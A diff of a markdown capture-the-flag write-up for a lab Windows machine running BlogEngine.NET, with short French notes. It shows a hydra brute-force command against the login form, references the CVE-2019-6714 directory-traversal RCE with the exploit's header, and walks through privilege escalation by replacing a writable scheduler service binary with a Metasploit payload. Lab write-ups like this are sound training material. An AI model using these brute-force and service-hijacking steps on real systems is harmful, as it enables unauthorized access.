@@ -14,24 +14,25 @@ Name of the clown : Pennywise
 
 https://tineye.com
 
-
+```html
 <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
 <input name="ctl00$MainContent$LoginUser$UserName" type="text" id="UserName" class="textEntry ltr-dir" />
 <input name="ctl00$MainContent$LoginUser$Password" type="password" id="Password" class="passwordEntry ltr-dir" />
+```
 
-
+```
 __VIEWSTATE=VONuS4qgtTqO8XE3V9OmRJIL5nfSzpal4XScbr8eUMj93ZW%2FERAk2VBHw%2B7g4fproUfMR0baI8D1OpVVAvCIcpPW%2FEZ5yZkHW8ejq1XvpqvU0PBSVCh8%2Fsd1Rrm8ErOT61hvRVeyglvlwr%2BOkNMIdK1JPW2yM03MOQsYxood64nMmE37l0T%2FX53vBIYLlW4zWeU8fdKDkAQd73iDnAlle94j839sst08jr7SBzdIejSzaePrAmlkwIrjPm1QlLLI2%2F9HCx17l4%2BrRc%2BTVV0TigCwHEN6AD67XJnHzpjLBX7BGxwlgo5RwUb0DLkEOkWGLSZWHp94Mg1UUDDLDDripwHXzuXQmIAum6pqN%2F0n2Wzf5Ngf&__EVENTVALIDATION=P4FLwWdgiB0Fyi14qTO2P6nQTj%2B%2FW99PPoHj%2Bodf5XQhP%2Fo3nlXcggU1rGi1%2Fp4pJzoaiAbbfnAtYjeyXHv%2F8G5BGavygh00rv142uGHsTuIaw7MIrATDaG3C3XJq9RygQv5trehheWQFdJPps0O7OFuB0%2B9FIWJbyW4V5Of82bnkT2%2B&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
-
+```
 
 Layout of command: hydra -L <USER> -P <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”
 
-
+```
 hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.4.18 http-post-form "/Account/login.aspx:ctl00$MainContent$LoginUser$UserName=^USER^&tl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:Login failed"
+```
 
-
+```
 hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.4.18 http-post-form "/Account/login.aspx:__VIEWSTATE=VONuS4qgtTqO8XE3V9OmRJIL5nfSzpal4XScbr8eUMj93ZW%2FERAk2VBHw%2B7g4fproUfMR0baI8D1OpVVAvCIcpPW%2FEZ5yZkHW8ejq1XvpqvU0PBSVCh8%2Fsd1Rrm8ErOT61hvRVeyglvlwr%2BOkNMIdK1JPW2yM03MOQsYxood64nMmE37l0T%2FX53vBIYLlW4zWeU8fdKDkAQd73iDnAlle94j839sst08jr7SBzdIejSzaePrAmlkwIrjPm1QlLLI2%2F9HCx17l4%2BrRc%2BTVV0TigCwHEN6AD67XJnHzpjLBX7BGxwlgo5RwUb0DLkEOkWGLSZWHp94Mg1UUDDLDDripwHXzuXQmIAum6pqN%2F0n2Wzf5Ngf&__EVENTVALIDATION=P4FLwWdgiB0Fyi14qTO2P6nQTj%2B%2FW99PPoHj%2Bodf5XQhP%2Fo3nlXcggU1rGi1%2Fp4pJzoaiAbbfnAtYjeyXHv%2F8G5BGavygh00rv142uGHsTuIaw7MIrATDaG3C3XJq9RygQv5trehheWQFdJPps0O7OFuB0%2B9FIWJbyW4V5Of82bnkT2%2B&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
-
-
+```
 
 http://10.10.4.18/Account/login.aspx
 
@@ -42,6 +43,7 @@ BlogEngine.NET v3.3.6.0
 
 https://www.exploit-db.com/exploits/46353
 
+```py
 # Exploit Title: BlogEngine.NET <= 3.3.6 Directory Traversal RCE
 # Date: 02-11-2019
 # Exploit Author: Dustin Cobb
@@ -50,7 +52,7 @@ https://www.exploit-db.com/exploits/46353
 # Version: <= 3.3.6
 # Tested on: Windows 2016 Standard / IIS 10.0
 # CVE : CVE-2019-6714
-
+```
 
 /admin/app/editor/editpost.cshtml
 
@@ -60,8 +62,10 @@ Upload du fichier PostView.ascx : OK
 
 Execution de l'exploit via l'appel à l'url `/?theme=../../App_Data/files` : OK, Got shell
 
+```
 c:\windows\system32\inetsrv>whoami
 iis apppool\blog
+```
 
 Tentative d'envoi du shell + exec via powershell : FAIL
 
@@ -114,7 +118,7 @@ Name                                    PathName
 WindowsScheduler                        C:\PROGRA~2\SYSTEM~1\WService.exe  
 ```
 
-
+```
 PRIVILEGES INFORMATION
 ----------------------
 Privilege Name                Description                               State   
@@ -126,8 +130,9 @@ SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
 
-
+```
 _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] SERVICES VULNERABILITIES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
 _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] SERVICE BINARY PERMISSIONS WITH WMIC + ICACLS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
@@ -140,18 +145,17 @@ C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)
 C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)
 C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)
 C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+```
 
+```
 _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] AppCmd <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
 C:\Windows\system32\inetsrv\appcmd.exe exists. 
-
+```
 
 WindowsScheduler.exe
 
-
 https://www.exploit-db.com/exploits/45072
-
-
 
 
 
@@ -174,16 +178,15 @@ set LPORT 9003
 run
 ```
 
+```
 ren Message.exe Message.bak
 ren mp9003.exe Message.exe
+```
 
-
+```
 03/25/2018  10:58 AM           536,992 Message.exe
 05/03/2020  01:25 PM            73,802 mp9003.exe
-
-
-
-## 
+```
 
 ```
 c:\windows\system32\inetsrv>systeminfo
